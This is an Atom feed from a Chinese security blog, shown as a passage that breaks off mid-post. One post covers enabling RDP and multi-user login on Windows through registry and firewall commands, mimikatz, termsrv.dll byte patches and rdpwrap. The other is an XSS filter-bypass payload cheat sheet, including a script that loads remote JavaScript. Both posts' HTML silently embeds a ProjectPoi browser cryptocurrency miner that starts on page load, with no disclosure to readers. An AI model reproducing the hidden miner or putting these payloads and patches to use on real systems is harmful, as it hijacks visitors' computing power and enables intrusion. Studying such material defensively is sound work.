<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damit5&#39;s Blog</title>
  
  
  <link href="//atom.xml" rel="self"/>
  
  <link href="http://damit5.ml/"/>
  <updated>2017-11-14T05:57:13.137Z</updated>
  <id>http://damit5.ml/</id>
  
  <author>
    <name>Damit 5</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows系统远程桌面的多用户登录</title>
    <link href="http://damit5.ml/2017/11/13/Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <id>http://damit5.ml/2017/11/13/Windows系统远程桌面的多用户登录/</id>
    <published>2017-11-13T05:41:22.000Z</published>
    <updated>2017-11-14T05:57:13.137Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer8" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer8"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。</p><p>虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效</p><p>那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。</p><a id="more"></a><h5 id="友情提示：方法一和方法三都不免杀，方法二需要-TrustedInstaller-权限"><a href="#友情提示：方法一和方法三都不免杀，方法二需要-TrustedInstaller-权限" class="headerlink" title="友情提示：方法一和方法三都不免杀，方法二需要 TrustedInstaller 权限"></a>友情提示：方法一和方法三都不免杀，方法二需要 TrustedInstaller 权限</h5><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><h5 id="本文将要介绍如下内容："><a href="#本文将要介绍如下内容：" class="headerlink" title="本文将要介绍如下内容："></a>本文将要介绍如下内容：</h5><ul><li><p>开启远程桌面的方法</p></li><li><p>使用mimikatz支持远程桌面多用户的原理</p></li><li><p>改进思路</p></li><li><p>测试工具rdpwrap</p></li></ul><h2 id="0x02-开启远程桌面的方法"><a href="#0x02-开启远程桌面的方法" class="headerlink" title="0x02 开启远程桌面的方法"></a>0x02 开启远程桌面的方法</h2><h4 id="1、查询系统是否允许3389远程连接"><a href="#1、查询系统是否允许3389远程连接" class="headerlink" title="1、查询系统是否允许3389远程连接"></a>1、查询系统是否允许3389远程连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</div></pre></td></tr></table></figure><h6 id="1表示关闭，0表示开启"><a href="#1表示关闭，0表示开启" class="headerlink" title="1表示关闭，0表示开启"></a>1表示关闭，0表示开启</h6><p>查看远程连接的端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</div></pre></td></tr></table></figure></p><p>端口格式为16进制，如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509695649103184.png" alt="1"></p><p>0xd3d转换为十进制为33389</p><h4 id="2、本机开启3389远程连接的方法"><a href="#2、本机开启3389远程连接的方法" class="headerlink" title="2、本机开启3389远程连接的方法"></a>2、本机开启3389远程连接的方法</h4><h6 id="方法1：通过cmd"><a href="#方法1：通过cmd" class="headerlink" title="方法1：通过cmd"></a>方法1：通过cmd</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</div><div class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</div></pre></td></tr></table></figure><h6 id="方法2：通过reg文件"><a href="#方法2：通过reg文件" class="headerlink" title="方法2：通过reg文件"></a>方法2：通过reg文件</h6><p>内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]</div><div class="line">&quot;fDenyTSConnections&quot;=dword:00000000</div><div class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]</div><div class="line">&quot;PortNumber&quot;=dword:00000d3d</div></pre></td></tr></table></figure></p><p>导入注册表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">regedit /s a.reg</div></pre></td></tr></table></figure></p><h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>如果修改连接端口，系统重启后才能生效</p><p>补充</p><p>如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口，如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696108150175.png" alt="1"></p><p>修改防火墙配置，允许3389端口的命令如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</div></pre></td></tr></table></figure><h4 id="3、远程连接方法"><a href="#3、远程连接方法" class="headerlink" title="3、远程连接方法"></a>3、远程连接方法</h4><p>kali使用3389远程连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdesktop 192.168.1.1:3389</div></pre></td></tr></table></figure></p><p>Windows：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mstsc.exe</div></pre></td></tr></table></figure></p><h2 id="0x03-非服务器版本的Windows系统默认只允许一个账户登录"><a href="#0x03-非服务器版本的Windows系统默认只允许一个账户登录" class="headerlink" title="0x03 非服务器版本的Windows系统默认只允许一个账户登录"></a>0x03 非服务器版本的Windows系统默认只允许一个账户登录</h2><p>具体表现为：</p><p>远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面</p><p>如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696187574769.png" alt="1"></p><p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696206120025.png" alt="1"></p><p>选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面)</p><p>如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696229986054.png" alt="1"></p><h2 id="0x04-非服务器版本的Windows系统支持多用户登录的方法"><a href="#0x04-非服务器版本的Windows系统支持多用户登录的方法" class="headerlink" title="0x04 非服务器版本的Windows系统支持多用户登录的方法"></a>0x04 非服务器版本的Windows系统支持多用户登录的方法</h2><h4 id="1、使用mimikatz"><a href="#1、使用mimikatz" class="headerlink" title="1、使用mimikatz"></a>1、使用mimikatz</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">privilege::debugts::multirdp</div></pre></td></tr></table></figure><p>执行如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696264202143.png" alt="1"></p><p>开启多用户登录功能，最高支持到Win7</p><p>使用与原系统相同的账户，原系统还是会被切换到登录界面</p><p>使用与原系统不同的账户，登录成功，如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696288976886.png" alt="1"></p><p>通过查看mimikatz的源码找到修改思路，代码位置如下：</p><p><a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c</a></p><p>Windows在开启服务Remote Desktop Services时，会加载termsrv.dll，如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696315433502.png" alt="1"></p><p>通过修改内存中的termsrv.dll实现开启多用户功能，具体操作如下：</p><p>Win7 x86：</p><p>查找:0x3B86200300000F84</p><p>替换为:0xC78620030000FFFFFF7F9090</p><p>Win7 x64：</p><p>查找:0x39873C0600000F84</p><p>替换为:0xC7873C060000FFFFFF7F9090</p><p>当然，该方法在系统重启后失效</p><p>更近一步，如果我们直接修改文件termsrv.dll，能否实现永久开启多用户登录的功能呢？</p><p>继续接下来的测试</p><h4 id="2、修改termsrv-dll"><a href="#2、修改termsrv-dll" class="headerlink" title="2、修改termsrv.dll"></a>2、修改termsrv.dll</h4><p>推荐工具： CFF Explorer</p><p>测试系统： Win7 x64</p><p>打开c：\windows\system32下的termsrv.dll</p><p>Hex Editor</p><p>查看十六进制数据39873C0600000F84</p><p>如下图</p><p><img src="http://www.4hou.com/uploads/20171103/1509696348182522.png" alt="1"></p><p>从0x0001738A处开始，选中12字节，替换为C7873C060000FFFFFF7F9090</p><p>保存dll</p><p>注：</p><p>需要先停止远程桌面服务才能替换termsrv.dll</p><p>替换termsrv.dll后，重新开启服务TermService</p><p>尝试使用不同用户远程连接，成功，验证该思路正确</p><p>完整操作如下：</p><h5 id="1-查看Remote-Desktop-Services服务状态"><a href="#1-查看Remote-Desktop-Services服务状态" class="headerlink" title="1.查看Remote Desktop Services服务状态"></a>1.查看Remote Desktop Services服务状态</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc qc TermService</div></pre></td></tr></table></figure><h5 id="2-如果服务启动，需要先关闭"><a href="#2-如果服务启动，需要先关闭" class="headerlink" title="2.如果服务启动，需要先关闭"></a>2.如果服务启动，需要先关闭</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net stop TermService /y</div></pre></td></tr></table></figure><h5 id="3-删除原termsrv-dll"><a href="#3-删除原termsrv-dll" class="headerlink" title="3.删除原termsrv.dll"></a>3.删除原termsrv.dll</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">del c:\windows\system32\termsrv.dll</div></pre></td></tr></table></figure><h5 id="4-替换新termsrv-dll"><a href="#4-替换新termsrv-dll" class="headerlink" title="4.替换新termsrv.dll"></a>4.替换新termsrv.dll</h5><h5 id="5-启动服务"><a href="#5-启动服务" class="headerlink" title="5.启动服务"></a>5.启动服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net start TermService</div></pre></td></tr></table></figure><h5 id="6-远程连接"><a href="#6-远程连接" class="headerlink" title="6.远程连接"></a>6.远程连接</h5><p>成功实现多用户登录</p><p>补充1：</p><p>Win7 x86：</p><p>查找:0x3B86200300000F84</p><p>替换为:0xC78620030000FFFFFF7F9090</p><p>补充2</p><p>常见Windows系统的版本号：</p><p><img src="http://www.4hou.com/uploads/20171103/1509696453711679.png" alt="1"></p><h4 id="3、使用工具rdpwrap"><a href="#3、使用工具rdpwrap" class="headerlink" title="3、使用工具rdpwrap"></a>3、使用工具rdpwrap</h4><p>工程地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/stascorp/rdpwrap</div></pre></td></tr></table></figure></p><p>工具地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/stascorp/rdpwrap/releases</div></pre></td></tr></table></figure></p><p>支持Win Vista – Win 10</p><p>不修改termsrv.dll，通过传入不同参数实现</p><p>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RDPWInst.exe -i is</div></pre></td></tr></table></figure></p><p>测试如下图<br><img src="http://www.4hou.com/uploads/20171103/1509696526799007.png" alt="1"></p><p>释放rdpwrap.dll和rdpwrap.ini至System32文件夹</p><p>rdpwrap.dll会被加载到同termsrv.dll相同的进程</p><p>此时，能够使用不同用户进行远程连接</p><p>卸载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RDPWInst.exe -u</div></pre></td></tr></table></figure></p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本文介绍了三种支持远程桌面多用户登录的方法，适用于不同条件，对于替换termsrv.dll的方法，需要根据系统具体版本，使用不同的替换位置</p>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer8&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer8&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。&lt;/p&gt;
&lt;p&gt;虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效&lt;/p&gt;
&lt;p&gt;那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://damit5.ml/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS 绕过常用语句</title>
    <link href="http://damit5.ml/2017/10/15/XSS-%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5/"/>
    <id>http://damit5.ml/2017/10/15/XSS-绕过常用语句/</id>
    <published>2017-10-15T06:29:27.000Z</published>
    <updated>2017-11-14T05:56:44.445Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面:::"></a>写在最前面:::</h4><p>下文中 <code>alert</code> 都可以由 <code>prompt</code> 代替</p><a id="more"></a><h2 id="最常用的-XSS-漏洞测试代码："><a href="#最常用的-XSS-漏洞测试代码：" class="headerlink" title="最常用的 XSS 漏洞测试代码："></a>最常用的 XSS 漏洞测试代码：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><h2 id="在输入-Input-标签里"><a href="#在输入-Input-标签里" class="headerlink" title="在输入(Input)标签里"></a>在输入(Input)标签里</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure><h4 id="闭合-lt-input-gt"><a href="#闭合-lt-input-gt" class="headerlink" title="闭合&lt;input&gt;"></a>闭合<code>&lt;input&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;</div></pre></td></tr></table></figure></p><p>所有的输入就会变成这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;&apos;&gt;</div></pre></td></tr></table></figure></p><p>Javascript 代码就注入了。<code>&lt;xss a=”&gt;</code>这个没什么意义，你可以自己改，但是符合 html 的标准，<br>页面不会出错。</p><h2 id="绕过单引号过滤"><a href="#绕过单引号过滤" class="headerlink" title="绕过单引号过滤"></a>绕过单引号过滤</h2><p>同样的例子，但是我们假设管理员在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通<br>过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;\&apos;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure><p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html<br>的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，<br>因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th></tr></thead><tbody><tr><td><code>&amp;#34;</code></td><td><code>&amp;quot;</code></td><td>“</td><td>双引号</td><td></td></tr><tr><td><code>&amp;#38;</code></td><td><code>&amp;amp;</code></td><td>&amp;</td><td>&amp;符号</td><td></td></tr><tr><td><code>&amp;#60;</code></td><td><code>&amp;lt;</code></td><td>&lt;</td><td>小于号</td><td></td></tr><tr><td><code>&amp;#62;</code></td><td><code>&amp;gt;</code></td><td>&gt;</td><td>大于号</td><td></td></tr></tbody></table><p>使用<code>&amp;quot;</code>或者<code>&amp;#34;</code><br>来代替我们的双引号，有时候可以绕过过滤。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;</div></pre></td></tr></table></figure><p>如果这都被过滤了。那我们可以使用 JavaScript 的 <code>fromCharCode</code> 函数，这个函数把指定的 Unicode<br>值转换成字符串。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</div></pre></td></tr></table></figure><h2 id="绕过-lt-SCRIPT-gt-过滤"><a href="#绕过-lt-SCRIPT-gt-过滤" class="headerlink" title="绕过 &lt;SCRIPT&gt;过滤"></a>绕过 <code>&lt;SCRIPT&gt;</code>过滤</h2><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload=&quot;alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure></p><p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;</div><div class="line"></div><div class="line">&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure><p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<code>&lt;script&gt;</code><br>标签哦。</p><h2 id="使用-IMG-源"><a href="#使用-IMG-源" class="headerlink" title="使用 IMG 源"></a>使用 IMG 源</h2><p>Html 中最常用的两个标签 <code>img</code> 和 <code>a href</code>一般是不会过滤的，一个指定图片，一个指定超链接。最危险的<br>是 <code>img</code> 标签</p><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><h6 id="标准的样子："><a href="#标准的样子：" class="headerlink" title="标准的样子："></a>标准的样子：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h6 id="没有双引号和分号"><a href="#没有双引号和分号" class="headerlink" title="没有双引号和分号:"></a>没有双引号和分号:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure><h6 id="不区分大小写的xss攻击向量"><a href="#不区分大小写的xss攻击向量" class="headerlink" title="不区分大小写的xss攻击向量"></a>不区分大小写的xss攻击向量</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure><h6 id="过滤了双引号和-lt-script-gt"><a href="#过滤了双引号和-lt-script-gt" class="headerlink" title="过滤了双引号和 &lt;script&gt;:"></a>过滤了双引号和 <code>&lt;script&gt;</code>:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</div></pre></td></tr></table></figure><h6 id="使用-CharCode-绕过过滤"><a href="#使用-CharCode-绕过过滤" class="headerlink" title="使用 CharCode 绕过过滤:"></a>使用 CharCode 绕过过滤:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div></pre></td></tr></table></figure><h6 id="有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码"><a href="#有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码" class="headerlink" title="有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:"></a>有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101; &amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</div></pre></td></tr></table></figure><h6 id="使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。"><a href="#使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。" class="headerlink" title="使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。"></a>使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp; #x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x58;&amp;#x53;&amp;#x53;&amp;#x27;&amp;#x29;&gt;</div></pre></td></tr></table></figure><h6 id="默认SRC属性去绕过SRC域名检测过滤器"><a href="#默认SRC属性去绕过SRC域名检测过滤器" class="headerlink" title="默认SRC属性去绕过SRC域名检测过滤器"></a>默认SRC属性去绕过SRC域名检测过滤器</h6><p>这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于热河一个HTML标签，例如Form、Iframe、Input、Embed等等。他将也允许任何任何该标签的相关事件去替换，例如onblur, onclick等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure></p><h6 id="默认SRC属性通过省略它的值"><a href="#默认SRC属性通过省略它的值" class="headerlink" title="默认SRC属性通过省略它的值"></a>默认SRC属性通过省略它的值</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h6 id="默认SRC属性通过完全不设置它"><a href="#默认SRC属性通过完全不设置它" class="headerlink" title="默认SRC属性通过完全不设置它"></a>默认SRC属性通过完全不设置它</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h6 id="结尾没有分号的十六进制html编码引用"><a href="#结尾没有分号的十六进制html编码引用" class="headerlink" title="结尾没有分号的十六进制html编码引用"></a>结尾没有分号的十六进制html编码引用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div></pre></td></tr></table></figure><h2 id="使用制表符-换行符和回车符"><a href="#使用制表符-换行符和回车符" class="headerlink" title="使用制表符, 换行符和回车符"></a>使用制表符, 换行符和回车符</h2><h6 id="使用了最小的十六进制的制表符来欺骗过滤器"><a href="#使用了最小的十六进制的制表符来欺骗过滤器" class="headerlink" 